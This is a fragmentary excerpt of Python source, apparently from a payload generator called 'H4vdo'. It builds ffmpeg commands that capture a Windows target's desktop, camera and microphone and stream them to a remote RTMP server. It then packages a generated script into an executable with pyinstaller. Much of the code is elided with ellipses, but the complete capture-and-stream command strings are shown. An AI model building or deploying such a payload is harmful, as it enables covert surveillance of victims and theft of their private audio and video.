...
class core():
    ...
    def __push_options(self,ip,port,path):
        ...
        if 0<=ops<=2:
            ...
            if ops == 0:
                ...
                payload= f'ffmpeg.exe -re -stream_loop -1 -i {mp4} -c:v libx264 -preset veryfast -maxrate 2000k -bufsize 4000k -pix_fmt yuv420p -c:a aac -b:a 128k -f flv rtmp://{ip}:{port}/{path}'
                logger.info("Pushing RTMP stream (MP4) ...")
                return payload
            elif ops == 1:
                list_ffmpeg_devices()
                microphone = input("Enter microphone name: ")
                payload= f'ffmpeg.exe -f gdigrab -framerate 30 -i desktop -f dshow -i audio="{microphone}" -c:v libx264 -preset veryfast -maxrate 2000k -bufsize 4000k -pix_fmt yuv420p -c:a aac -b:a 128k -f flv rtmp://{ip}:{port}/{path}'
                ...
                microphone = input("Enter microphone name: ")
                payload= f'ffmpeg.exe -f dshow -i video="{camera}" -f dshow -i audio="{microphone}" -c:v libx264 -preset veryfast -maxrate 2000k -bufsize 4000k -pix_fmt yuv420p -c:a aac -b:a 128k -f flv rtmp://{ip}:{port}/{path}'
    ...
    def __generate_file(self,note):
        ...
        try:
            with open('H4vdo_debug.py','w',encoding='utf-8')as f:
                f.write(note)
        except Exception as e:
    ...
    def __generate_payload(self, host, port, path):
        ...
        try:
            ...
            try:
                result = subprocess.run(
                    'pyinstaller --add-data "libvlc.dll;." --add-data "libvlccore.dll;." --add-data "plugins*;plugins" H4vdo_debug.py',
                    stdout=subprocess.DEVNULL,
                ...
                logger.info("Generate Payload completed, in ./dist/")
